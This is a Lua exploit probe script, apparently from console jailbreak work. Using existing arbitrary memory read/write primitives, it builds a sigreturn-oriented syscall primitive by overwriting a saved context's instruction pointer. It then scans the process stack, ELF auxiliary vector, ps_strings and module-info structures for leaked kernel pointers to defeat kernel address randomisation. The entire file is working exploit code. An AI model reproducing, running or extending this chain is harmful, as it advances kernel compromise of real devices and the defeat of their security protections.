-- CRASH_CLASS: LOW
-- PROBE 136a: Read ELF auxiliary vector from stack + kernel pointer hunt
--
-- kern.usrstack = 0x7EF1CC000. The ELF auxiliary vector is near this
-- address and may contain AT_TIMEKEEP (vdso pointer), AT_PHDR, etc.
-- Also: try reading the stack for any kernel addresses that might
-- have been left by the kernel during process setup.

print("=== PROBE 136a: AUXV + STACK SCAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end

--------------------------------------------------------------------
-- SECTION A: Get usrstack and scan near it
--------------------------------------------------------------------
print("")
print("--- [A] Stack scan ---")

local mib = gpu + 0x100
local outbuf = gpu + 0x200
local oldlenp = gpu + 0x300

-- Get kern.usrstack
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 33)
memory.write_qword(oldlenp, uint64(8))
memory.write_qword(outbuf, uint64(0))
local rv_sc = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp),
    uint64(0), uint64(0))
local usrstack = memory.read_qword(outbuf)
print("[A] kern.usrstack=" .. hex(usrstack))
local ush, usl = get_hi_lo(usrstack)

if ush > 0 or usl > 0 then
    -- Scan backward from usrstack looking for the auxiliary vector
    -- On FreeBSD, the initial stack contains: argc, argv[], NULL,
    -- envp[], NULL, auxv[] entries (type,value pairs)

    -- The stack page is at usrstack-pagesize to usrstack
    -- Scan the page below usrstack
    local scan_base_h = ush
    local scan_base_l = usl - 0x4000  -- 16KB page below
    if scan_base_l < 0 then
        scan_base_l = scan_base_l + 0x100000000
        scan_base_h = scan_base_h - 1
    end

    local scan_addr = uint64(string.format("0x%X%08X", scan_base_h, scan_base_l))
    print("[A] scanning from " .. hex(scan_addr))

    local kptr_found = 0
    local interesting = {}

    -- Scan for kernel pointers and AT_* entries
    for off = 0, 0x3FF0, 8 do
        local addr = uint64(string.format("0x%X%08X", scan_base_h,
            scan_base_l + off))
        local v = safe_rq(addr)
        if v then
            local vh, vl = get_hi_lo(v)
            -- Kernel pointer check
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                kptr_found = kptr_found + 1
                print(string.format("[A] *** KPTR at stack+0x%04X: %s ***", off, hex(v)))
                if kptr_found > 10 then break end
            end
            -- AT_* type detection: AT types are small numbers (1-50)
            -- auxv entries are pairs: {type, value}
            if vl > 0 and vl < 50 and vh == 0 then
                -- This might be an AT_* type
                local next_v = safe_rq(uint64(string.format("0x%X%08X",
                    scan_base_h, scan_base_l + off + 8)))
                if next_v then
                    local nvh, nvl = get_hi_lo(next_v)
                    if nvh > 0 or nvl > 0 then
                        table.insert(interesting, {off=off, at=vl, val=next_v})
                    end
                end
            end
        end
    end

    if kptr_found == 0 then
        print("[A] No kernel pointers found in stack page")
    end

    -- Print AT_* candidates
    if #interesting > 0 then
        print("[A] AT_* candidates:")
        for _, e in ipairs(interesting) do
            local evh, evl = get_hi_lo(e.val)
            local at_names = {
                [3]="AT_PHDR", [4]="AT_PHENT", [5]="AT_PHNUM",
                [6]="AT_PAGESZ", [7]="AT_BASE", [8]="AT_FLAGS",
                [9]="AT_ENTRY", [15]="AT_EXECPATH",
                [16]="AT_CANARY", [17]="AT_CANARYLEN",
                [18]="AT_OSRELDATE", [19]="AT_NCPUS",
                [20]="AT_PAGESIZES", [21]="AT_PAGESIZESLEN",
                [22]="AT_TIMEKEEP", [23]="AT_STACKPROT",
                [24]="AT_EHDRFLAGS", [25]="AT_HWCAP",
                [26]="AT_HWCAP2",
            }
            local name = at_names[e.at] or string.format("AT_%d", e.at)
            print(string.format("  +0x%04X: %s = %s", e.off, name, hex(e.val)))
            if evh >= 0xFFFF8000 and evh ~= 0xFFFFFFFF then
                print("    *** KERNEL POINTER! ***")
            end
        end
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Read ps_strings area
--------------------------------------------------------------------
print("")
print("--- [B] ps_strings ---")

-- kern.ps_strings
memory.write_dword(mib, 1)
memory.write_dword(mib + 4, 32)
memory.write_qword(oldlenp, uint64(8))
memory.write_qword(outbuf, uint64(0))
rv_sc = srop(202, ua(mib), uint64(2), ua(outbuf), ua(oldlenp),
    uint64(0), uint64(0))
local ps = memory.read_qword(outbuf)
print("[B] kern.ps_strings rv=" .. hex(rv_sc) .. " val=" .. hex(ps))

-- If ps_strings is valid, try reading the structure
local psh, psl = get_hi_lo(ps)
if (psh > 0 or psl > 0) and psh < 0xFFFF then
    print("[B] ps_strings is userland addr, reading...")
    for off = 0, 0x38, 8 do
        local v = safe_rq(uint64(string.format("0x%X%08X", psh, psl + off)))
        if v then
            local vh, vl = get_hi_lo(v)
            print(string.format("  +0x%02X: %s", off, hex(v)))
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                print("  *** KERNEL POINTER! ***")
            end
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: Scan dynlib_get_info deep structs for kernel ptrs
--------------------------------------------------------------------
print("")
print("--- [C] Module info deep scan ---")

-- sys 649 (member query) with types that might have kernel ptrs
-- We know types 1-4, 7, 8 return userland addresses
-- Try higher member types
local sc649 = make_syscall(649)
local sc593 = make_syscall(593)

-- Get eboot handle (handle 0)
local info = memory.alloc(0x200)
for off = 0, 0x1FF, 4 do memory.write_dword(info + off, 0) end
memory.write_dword(info, 0x160)
pcall(function() sc593(uint64(0), uint64(string.format("0x%X", to_num(info)))) end)
local text_lo = to_num(memory.read_dword(info + 0x108))
local text_hi = to_num(memory.read_dword(info + 0x10C))
if text_hi > 0 or text_lo > 0 then
    print("[C] eboot text=" .. string.format("0x%X%08X", text_hi, text_lo))
end

-- Try sys 649 with member types 9-20
for member = 9, 20 do
    memory.write_qword(outbuf, uint64(0))
    local ok649, rv649 = pcall(function()
        return sc649(uint64(0), uint64(member), uint64(string.format("0x%X", to_num(outbuf))))
    end)
    if ok649 then
        local v = memory.read_qword(outbuf)
        local vh, vl = get_hi_lo(v)
        if vh > 0 or vl > 0 then
            print(string.format("[C] handle=0 member=%d: %s", member, hex(v)))
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                print("  *** KERNEL POINTER! ***")
            end
        end
    end
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: Scan dynlib_get_info struct for ALL non-zero values
--------------------------------------------------------------------
print("")
print("--- [D] Full module struct dump ---")

-- Already have info buffer from section C. Dump it.
for off = 0, 0x15F, 8 do
    local v = safe_rq(info + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh > 0 or vl > 0 then
            print(string.format("[D] info+0x%03X: %s", off, hex(v)))
            if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                print("  *** KERNEL POINTER! ***")
            end
        end
    end
end

print("")
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
